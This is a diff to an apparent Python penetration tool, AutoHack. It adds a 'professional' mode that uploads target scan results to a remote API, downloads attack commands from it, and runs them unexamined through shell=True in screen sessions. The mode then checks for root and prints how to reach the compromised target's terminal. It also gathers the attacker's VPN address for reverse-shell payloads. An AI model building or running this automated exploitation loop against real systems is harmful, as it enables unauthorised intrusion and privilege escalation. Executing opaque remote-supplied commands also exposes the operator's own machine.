@@ -2,9 +2,14 @@
 import os
 import re
 import site
+import subprocess as sp
 import time
 import shlex
 import argparse
+import uuid
+
+import requests
+from glob import glob
 from dataclasses import dataclass
 from multiprocessing import Lock
 from multiprocessing import Process
@@ -25,6 +30,11 @@ class Colors:
     END = '\033[0m'
     BOLD = '\033[1m'
 
+
+class SuccessStatus:
+    EXPLOIT_UNSUCCESSFUL = 'EXPLOIT_UNSUCCESSFUL'
+    EXPLOIT_SUCCESSFUL = 'EXPLOIT_SUCCESSFUL'
+    PRIVILEGE_ESCALATE_SUCCESSFUL = 'PRIVILEGE_ESCALATE_SUCCESSFUL'
 
 class Utils:
     class AutoHackException(Exception):
@@ -181,6 +191,31 @@ class Utils:
                  f'{non_tick_marks}|{Colors.CYAN}({max_value} {unit}){Colors.END}')
         return chart
 
+    @staticmethod
+    def get_attacker_address(interface='tun0') -> str | None:
+        """
+        Gets ip address of attacker. This is used for
+        obtaining a reverse shell.
+
+        By default, it uses the tun0 network interface since the attacker
+        is likely connected to the target through a vpn.
+
+        :param interface:
+        :return:
+        """
+        try:
+            result = sp.check_output(
+                ['ip', '-4', 'addr', 'show', interface],
+                stderr=sp.STDOUT
+            )
+            result = result.decode().splitlines()
+            ipaddr = [l.split()[1].split('/')[0] for l in result if "inet" in l]
+            return ipaddr[0]
+
+        except (Exception,):
+            return None
+
+
 
 @dataclass
 class ProcessReference:
@@ -314,7 +349,7 @@ class ProcessManager:
                 self.print_active_processes_data(active_processes)
 
             # kill heart_beat once primary and secondary enumeration is complete
-            should_kill_heart_beat = AutoHack.primary_enumeration_is_complete and len(active_processes) == 0
+            should_kill_heart_beat = AutoHack.should_kill_heart_beat and len(active_processes) == 0
 
             if should_kill_heart_beat:
                 break
@@ -324,18 +359,21 @@ class ProcessManager:
 
 
 class AutoHack:
-    primary_enumeration_is_complete = False
+    should_kill_heart_beat = False
     command_timeout = 0
+    api_source = os.getenv('AUTOHACK_API_SOURCE') or 'https://api.autohack.com'
+    api_key = os.getenv('AUTOHACK_API_KEY') or 'FREE'
 
     def __init__(
-        self, ip_address, output_directory=None, config_directory=None,
+        self, ip_address, attacker_ip_address, output_directory=None, config_directory=None,
         port_scan_type=None, nmap_extra=None, ports=None,
         use_processes=None, verbose=None, command_timeout=None,
-        heart_beat_time=None, retry_max=None
+        heart_beat_time=None, retry_max=None, professional=None
     ) -> None:
         AutoHack.command_timeout = command_timeout
         self.process_lock = Utils.get_lock()
-        self.address = ip_address
+        self.target_address = ip_address
+        self.attacker_address = attacker_ip_address
         self.port_scan_type = port_scan_type
         self.nmap_extra = nmap_extra
         self.ports = ports
@@ -343,6 +381,7 @@ class AutoHack:
         self.use_processes = use_processes
         self.verbose = verbose
         self.retry_max = retry_max
+        self.professional = professional
         self.process_manager = ProcessManager(
             verbose=verbose,
             time_between_heart_beats=heart_beat_time,
@@ -352,7 +391,7 @@ class AutoHack:
 
         output_directory = output_directory or os.path.join(
             self.current_working_directory,
-            'results', self.address
+            'results', self.target_address
         )
         config_directory = self.get_config(config_directory)
         port_scan_config_file = os.path.join(config_directory, 'port-scans.toml')
@@ -373,23 +412,29 @@ class AutoHack:
         self.scan_directory = os.path.join(output_directory, 'scans')
         xml_directory = os.path.join(self.scan_directory, 'xml')
         log_directory = os.path.join(self.scan_directory, 'logs')
-        exploit_directory = os.path.join(output_directory, 'exploit')
-        priv_directory = os.path.join(output_directory, 'priv')
+        self.exploit_directory = os.path.join(output_directory, 'exploit')
+        self.exploit_commands_attempted_directory = os.path.join(self.exploit_directory, 'commands_attempted')
+        self.priv_directory = os.path.join(output_directory, 'priv')
         loot_directory = os.path.join(output_directory, 'loot')
         Utils.make_directories(
             self.scan_directory, xml_directory, log_directory,
-            exploit_directory, priv_directory, loot_directory
+            self.exploit_directory, self.priv_directory, loot_directory,
+            self.exploit_commands_attempted_directory
         )
 
         self.detected_services = set()
         self.pattern_matches = dict()
-        self.manual_scans = set()
+        self.exploit_scans = set()
         self.commands_ran = set()
         self.commands_run_log = os.path.join(log_directory, 'commands.log')
         self.detected_services_log = os.path.join(log_directory, 'detected_services.log')
-        self.manual_steps_log = os.path.join(log_directory, 'manual_steps.log')
+        self.exploit_steps_log = os.path.join(log_directory, 'exploit_steps.log')
         self.patterns_detected_log = os.path.join(log_directory, 'patterns.log')
-        Utils.clear_file(self.manual_steps_log)
+        self.session_id: str | None = None
+        self.spearhead_index_unique_id: str | None = None
+        self.expected_command_answers_to_verify_root_access: dict = {}
+        self.success_status = SuccessStatus.EXPLOIT_UNSUCCESSFUL
+        Utils.clear_file(self.exploit_steps_log)
 
     def get_config(self, config_directory: str):
         """
@@ -488,25 +533,25 @@ class AutoHack:
                 f.write(f"{detected_service}\n")
             self.process_lock.release()
 
-    def log_manual_steps(self, manual_scans: List[Dict], service_scan_data: Dict) -> None:
+    def log_exploit_steps(self, exploit_scans: List[Dict], service_scan_data: Dict) -> None:
         """
-        Writes manual scans to a log file
-        :param manual_scans:
+        Writes exploit scans to a log file
+        :param exploit_scans:
         :param service_scan_data:
         :return:
         """
-        with open(self.manual_steps_log, 'a') as f:
+        with open(self.exploit_steps_log, 'a') as f:
             self.process_lock.acquire()
-            for sub_scan in manual_scans:
+            for sub_scan in exploit_scans:
                 message = f"[*] {sub_scan['description']}\n"
                 wrote_command = False
 
                 for command in sub_scan['commands']:
                     command = command.format(**service_scan_data)
-                    if command in self.manual_scans:
+                    if command in self.exploit_scans:
                         continue
                     wrote_command = True
-                    self.manual_scans.add(command)
+                    self.exploit_scans.add(command)
                     message += f"\t{command}\n"
                 if wrote_command:
                     f.write(f"{message}\n\n")
@@ -573,13 +618,16 @@ class AutoHack:
                     f.write(message)
         self.process_lock.release()
 
-    def run_command(self, command: str) -> None:
+    def run_command(self, command: str, should_log=True) -> None:
         """
         Executes a command
         :param command:
+        :param should_log:
         :return:
         """
-        self.log_command(command)
+        if should_log:
+            self.log_command(command)
+
         process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
         _, __ = process.communicate()
 
@@ -620,6 +668,8 @@ class AutoHack:
 
         # let heart beat thread complete after process
         self.process_manager.heart_beat_process.join()
+        print('\n\n')
+        Utils.print_time()
 
     def execute_secondary_enumerate_command(
             self, command: str,
@@ -644,10 +694,15 @@ class AutoHack:
         if Utils.should_run_command(output_file):
             self.commands_ran.add(command)
             command = 'sudo ' + command
-            command_printed = f"SECONDARY ENUMERATE:\n\t{Colors.GREEN}{command}{Colors.END}"
+            time_before_command = int(time.time())
+            command_printed = f"SECONDARY ENUMERATE: [at {time_before_command}]\n\t{Colors.GREEN}{command}{Colors.END}"
             self.process_print(command_printed)
             self.run_command(command)
-            self.process_print(f"{Colors.MAGENTA}{Colors.BOLD}Command Completed{Colors.END}\n")
+            time_after_command = int(time.time())
+            self.process_print(
+                f"{Colors.MAGENTA}{Colors.BOLD}Command Completed{Colors.END} "
+                f"[at {time_after_command}]\n"
+            )
 
         if output_file is None:
             return
@@ -675,10 +730,15 @@ class AutoHack:
         if Utils.should_run_command(output_file):
             self.commands_ran.add(command)
             command = 'sudo ' + command
-            command_printed = f"PRIMARY ENUMERATE:\n\t{Colors.GREEN}{command}{Colors.END}"
+            time_before_command = int(time.time())
+            command_printed = f"PRIMARY ENUMERATE: [at {time_before_command}]\n\t{Colors.GREEN}{command}{Colors.END}"
             self.process_print(command_printed)
             self.run_command(command)
-            self.process_print(f"{Colors.MAGENTA}{Colors.BOLD}Command Completed{Colors.END}\n")
+            time_after_command = int(time.time())
+            self.process_print(
+                f"{Colors.MAGENTA}{Colors.BOLD}Primary Command Completed{Colors.END} "
+                f"[at {time_after_command}]\n"
+            )
 
         if output_file is None:
             return
@@ -712,7 +772,7 @@ class AutoHack:
             service_scan_data = {
                 'nmap_extra': self.nmap_extra,
                 'scandir': self.scan_directory,
-                'address': self.address,
+                'target_address': self.target_address,
                 'port': port['portid'],
                 'protocol': port['protocol'],
                 'name': service['name'],
@@ -733,8 +793,8 @@ class AutoHack:
                 if match is None:
                     continue
 
-                if 'manual' in scan:
-                    self.log_manual_steps(scan['manual'], service_scan_data)
+                if 'exploit' in scan:
+                    self.log_exploit_steps(scan['exploit'], service_scan_data)
 
                 if 'scan' not in scan:
                     continue
@@ -758,16 +818,18 @@ class AutoHack:
 
             self.log_detected_services()
 
-    def primary_enumerate(self) -> None:
+    def enumerate(self) -> None:
         """
         Does primary enumeration based on scans in the
         service-scans.toml in config folder and user-selected scan type
         :return:
         """
+        Utils.print_time()
+
         port_scan_data = {
             'nmap_extra': self.nmap_extra,
             'scandir': self.scan_directory,
-            'address': self.address,
+            'target_address': self.target_address,
             'ports': self.ports,
         }
 
@@ -777,7 +839,286 @@ class AutoHack:
                 self.execute_primary_enumerate_command(
                     command, port_scan_data
                 )
-        AutoHack.primary_enumeration_is_complete = True
+
+    def upload_enumeration_files(self):
+        """
+        Uploads enumeration file and receives the session_id from the api
+        """
+        xml_file_pattern = glob(f'{self.scan_directory}/xml/*.xml')
+        text_file_pattern = glob(f'{self.scan_directory}/*.txt')
+        files_to_upload = {}
+        files_uploaded_without_extensions = set()
+
+        for file_path in xml_file_pattern + text_file_pattern:
+            file_name_with_extension = os.path.basename(file_path)
+            file_path_without_extension = os.path.splitext(file_name_with_extension)[0]
+
+            if file_path_without_extension in files_uploaded_without_extensions:
+                continue
+
+            files_uploaded_without_extensions.add(file_path_without_extension)
+            files_to_upload[file_name_with_extension] = open(file_path, 'rb').read()
+
+        url = f'{self.api_source}/analyze-enumerate-results'
+        attacker_address = self.attacker_address or Utils.get_attacker_address()
+        if attacker_address is None:
+            raise Utils.AutoHackException('Attacker Address Must Be Defined')
+
+        headers = {
+            'API_KEY': self.api_key,
+            'target_address': self.target_address,
+            'attacker_address': self.attacker_address or Utils.get_attacker_address(),
+            'scandir': self.scan_directory,
+        }
+        response = requests.post(url, files=files_to_upload, headers=headers)
+        response_data = response.json()
+        self.session_id = response_data['session_id']
+
+    def get_best_attack(self) -> dict:
+        """
+        Requests the current best attack from the Api
+        """
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        url = f'{self.api_source}/get-best-attack'
+        response = requests.post(url, headers=headers)
+        response_data = response.json()
+        return response_data
+
+    def execute_attack(self, attack: dict):
+        """
+            Runs commands in attack via screen. Some commands
+            may block subsequent commands.
+        """
+        commands = attack['attack_commands']['command_group']
+        is_blocking = attack['attack_commands']['meta']['command_should_block']
+        vul_name = attack['attack_commands']['vulnerability_name'].strip()
+        spearhead_index = attack['attack_commands']['meta']['spearhead_index']
+
+        print(f'{Colors.CYAN}RUNNING ATTACK COMMANDS FOR:{Colors.END} {vul_name}:\n')
+
+        for index, command in enumerate(commands):
+            unique_screen_name = str(uuid.uuid4())
+            if spearhead_index == index:
+                self.spearhead_index_unique_id = unique_screen_name
+
+            command_file_path = os.path.join(
+                self.exploit_commands_attempted_directory,
+                f'{unique_screen_name}.txt'
+            )
+            with open(command_file_path, "w") as file:
+                file.write(command)
+
+            screen_command = f'screen -dmS {unique_screen_name} bash -c "$(cat {command_file_path})"'
+
+            target = self.run_command
+            arguments = (screen_command, False)
+
+            time_before_command = int(time.time())
+            command_printed = (
+                f"\tEXPLOIT COMMAND-{index} [at {time_before_command}]\n"
+                f"\t\t{Colors.GREEN}{command}{Colors.END}\n"
+            )
+            print(command_printed)
+
+            p = Process(target=target, args=arguments)
+            p.start()
+            p.join()
+
+            if is_blocking[index]:
+                # wait for screen command to finish
+                blocking_command = f"tail --pid=$(pgrep -f {unique_screen_name}) -f /dev/null"
+                self.run_command(blocking_command, False)
+
+            # remove command file to clean up directory
+            os.remove(command_file_path)
+
+    def attack_is_successful(self, attack) -> bool:
+        """
+            Examines main attack screen output to see if attack was successful.
+            * Creates file with screen contents
+            * Grabs file contents
+            * Sends file to server
+        """
+        message = f"\t{Colors.MAGENTA}VERIFYING ATTACK SUCCESS{Colors.END} [at {int(time.time())}]"
+        print(message)
+
+        # slow execution to ensure attack ran
+        time.sleep(2)
+
+        output_file_path =  os.path.join(self.exploit_directory, f'{self.spearhead_index_unique_id}.txt')
+        grab_screen_command = f"screen -r {self.spearhead_index_unique_id} -X hardcopy {output_file_path}"
+
+        # create file with contents
+        self.run_command(grab_screen_command, False)
+
+        main_screen_output = open(output_file_path, 'r').read()
+
+        url = f'{self.api_source}/verify-best-attack-success'
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        response = requests.post(url, json=main_screen_output, headers=headers)
+        response_data = response.json()
+
+        return response_data['is_successful']
+
+    def attack_repeatedly(self):
+        """
+        Repeatedly
+            Gets the best attack based on the previous enumeration output
+            and then implements attack until all attacks have been exhausted
+        """
+        self.upload_enumeration_files()
+
+        while True:
+            best_attack = self.get_best_attack()
+            if not best_attack['should_continue']:
+                print('No Exploit Discovered: Ending Program')
+                break
+
+            self.execute_attack(best_attack)
+            if self.attack_is_successful(best_attack):
+                message = f"\t{Colors.GREEN}{Colors.BOLD}ATTACK SUCCESSFUL{Colors.END} [at {int(time.time())}]\n"
+                print(message)
+                self.success_status = SuccessStatus.EXPLOIT_SUCCESSFUL
+                break
+
+    def get_is_user_root_commands(self) -> dict:
+        """
+        Requests commands and expected answers
+        that verify root access
+        """
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        url = f'{self.api_source}/get-is-user-root-commands'
+        response = requests.post(url, headers=headers)
+        response_data = response.json()
+        return response_data
+
+    def user_is_root(self) -> bool:
+        for key_command in self.expected_command_answers_to_verify_root_access:
+            """
+                * Runs verification command on spearhead terminal session
+                * Runs grab screen session command
+                * Examines the output for expected command answers
+            """
+            data = self.expected_command_answers_to_verify_root_access[key_command]
+            expected_output_when_root = data['answer']
+            command_wait_time_in_seconds = data['wait']
+
+            verify_command = f'screen -S {self.spearhead_index_unique_id} -X stuff "{key_command}"'
+            self.run_command(verify_command, False)
+
+            # delay so command will run
+            time.sleep(command_wait_time_in_seconds)
+
+            output_file_path =  os.path.join(
+                self.priv_directory,
+                f'{self.spearhead_index_unique_id}.txt'
+            )
+
+            # use the current output file size so we can get the newly written content
+            output_filesize_before_running_command = 0
+            if os.path.exists(output_file_path):
+                output_filesize_before_running_command = os.path.getsize(output_file_path)
+
+            grab_screen_command = f"screen -r {self.spearhead_index_unique_id} -X hardcopy {output_file_path}"
+            self.run_command(grab_screen_command, False)
+
+            output_file_handle = open(output_file_path, 'r')
+            output_file_handle.seek(output_filesize_before_running_command)
+            output_produced_by_command = output_file_handle.read()
+
+            if expected_output_when_root in output_produced_by_command:
+                self.success_status = SuccessStatus.PRIVILEGE_ESCALATE_SUCCESSFUL
+                return True
+
+        return False
+
+    @staticmethod
+    def print_user_is_root_successful():
+        message = (
+            f'\t{Colors.GREEN}{Colors.BOLD}ROOT ACCESS SUCCESSFUL{Colors.END}'
+        )
+        print(message)
+
+    @staticmethod
+    def print_user_is_root_unsuccessful():
+        message = (
+            f'\t{Colors.RED}{Colors.BOLD}ROOT ACCESS UNSUCCESSFUL{Colors.END}'
+        )
+        print(message)
+
+    def privilege_escalate_repeatedly(self):
+        """
+            when user is not root
+                -enumerate
+                -repeatedly attack and check for root access
+        """
+        # load the expected root command-answers once
+        self.expected_command_answers_to_verify_root_access = self.get_is_user_root_commands()
+
+        message = (
+            f'\n\n'
+            f'{Colors.CYAN}VERIFYING ROOT ACCESS:{Colors.END}'
+        )
+        print(message)
+
+        if self.user_is_root():
+            self.print_user_is_root_successful()
+            return
+        else:
+            self.print_user_is_root_unsuccessful()
+
+        # todo: enumerate target os
+        # todo: upload target os enumeration data
+
+        # repeatedly exploit and check for root access
+        tries = 0
+        while True:
+            # todo: attack
+            if self.user_is_root():
+                break
+
+            if tries > 5:
+                break
+
+            tries += 1
+
+    def handle_success(self):
+        if self.success_status == SuccessStatus.PRIVILEGE_ESCALATE_SUCCESSFUL:
+            message = (
+                f'\n\n\n'
+                f'{Colors.CYAN}{Colors.BOLD}TO ACCESS TARGET ROOT TERMINAL, RUN COMMAND:{Colors.END}\n'
+                f'{Colors.GREEN}{Colors.BOLD}\tscreen -r {self.spearhead_index_unique_id}{Colors.END}'
+            )
+            print(message)
+        elif self.success_status == SuccessStatus.EXPLOIT_SUCCESSFUL:
+            message = (
+                f'\n\n\n'
+                f'{Colors.CYAN}{Colors.BOLD}TO ACCESS TARGET NON-ROOT TERMINAL, RUN COMMAND:{Colors.END}\n'
+                f'{Colors.GREEN}{Colors.BOLD}\tscreen -r {self.spearhead_index_unique_id}{Colors.END}'
+            )
+            print(message)
+
+    def exploit(self) -> None:
+        """
+        When run in professional mode, code exploits based on
+        commands generated by AutoHack's API
+        :return:
+        """
+        if self.professional:
+            self.attack_repeatedly()
+            self.privilege_escalate_repeatedly()
+            self.handle_success()
+
+        AutoHack.should_kill_heart_beat = True
 
 
 if __name__ == "__main__":
@@ -798,8 +1139,16 @@ if __name__ == "__main__":
                 -analyzed for regex patterns
     """
     parser = argparse.ArgumentParser(description='Does Enumeration')
-    parser.add_argument('-i', '--ip_address', action='store', type=str,
-                        dest='ip_address', help='IP Address', required=True)
+    parser.add_argument(
+        '-i', '--ip_address', action='store', type=str,
+        dest='ip_addr'
+             'ess', help='IP Address', required=True
+    )
+    parser.add_argument(
+        '-ai', '--attacker_ip_address', action='store', type=str,
+        dest='attacker_ip_address', required=False,
+        help='Attackers IP Address, Used When Crafting Reverse Shell Payload'
+    )
     parser.add_argument(
         '-c', '--config', action='store', type=str,
         dest='config_folder', help='Config Folder'
@@ -846,9 +1195,17 @@ if __name__ == "__main__":
         dest='heart_beat_time', help='Seconds Between Heart Beats',
         default=60
     )
+    parser.add_argument(
+        '-pro', '--professional',
+        action=argparse.BooleanOptionalAction, type=bool, dest='professional',
+        help="Uses AutoHack's API to Iteratively Generate and Run Commands "
+             "that Attack Target Machine Based on Previous Command-Output Files. "
+             "Only Use This If You Have Permission to Penetrate the Target Machine.",
+    )
     args = parser.parse_args()
     autohack = AutoHack(
         ip_address=args.ip_address,
+        attacker_ip_address=args.attacker_ip_address,
         output_directory=args.output_folder,
         config_directory=args.config_folder,
         port_scan_type=args.port_scan_type,
@@ -859,8 +1216,11 @@ if __name__ == "__main__":
         command_timeout=args.command_timeout,
         heart_beat_time=args.heart_beat_time,
         retry_max=args.retry_max,
+        professional=args.professional
     )
-    Utils.print_time()
-    autohack.primary_enumerate()
+
+    autohack.enumerate()
+    autohack.exploit()
     autohack.wait_for_all_processes()
-    print('\nAutoHack Complete')
+
+    print('AutoHack Complete')
